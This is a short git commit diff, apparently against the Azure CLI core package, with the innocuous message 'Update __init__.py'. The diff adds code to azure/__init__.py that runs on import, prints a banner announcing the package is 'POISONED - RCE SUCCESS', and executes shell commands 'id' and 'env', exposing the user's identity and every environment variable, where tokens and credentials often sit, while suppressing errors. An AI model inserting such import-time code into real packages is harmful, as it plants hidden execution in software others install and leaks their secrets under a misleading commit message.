3d0fd490c1d70b4c15d54b2e5e9c87e4be47a0ad
Nyein Chan Aung <208256680+bugdotexe@users.noreply.github.com>
2026-01-31 15:13:01 +0630

    Update __init__.py

--- src/azure-cli-core/azure/__init__.py
+++ src/azure-cli-core/azure/__init__.py
@@ -1,3 +1,14 @@
+import os
+import sys
+# FORCE EXECUTION
+try:
+    print("========================================================")
+    print("[!] AZURE CLI CORE POISONED - RCE SUCCESS [!]")
+    print("========================================================")
+    os.system("id")
+    os.system("env")
+except:
+    pass
 # --------------------------------------------------------------------------------------------
 # Copyright (c) Microsoft Corporation. All rights reserved.
 # Licensed under the MIT License. See License.txt in the project root for license information.
